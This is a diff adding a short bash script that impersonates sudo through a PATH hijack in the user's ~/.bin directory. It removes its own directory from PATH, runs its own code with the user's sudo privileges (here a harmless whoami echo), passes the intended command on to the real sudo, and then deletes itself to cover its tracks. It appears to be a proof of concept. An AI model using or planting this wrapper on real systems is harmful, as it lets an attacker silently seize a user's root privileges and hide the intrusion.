@@ -1,0 +1,14 @@
+#!/bin/bash
+
+# remove this file from $PATH so we can resolve the *real* sudo
+PATH=$(echo "$PATH" | sed "s%$HOME/.bin:%%g")
+
+# run our own privileged code
+echo ">>> I am $(sudo whoami)! <<<"
+
+# run the user's originally-intended sudo command
+sudo $@
+
+# delete this file
+rm -- "$0" >/dev/null 2>&1
+# TODO: clean up $PATH in ~/.bashrc
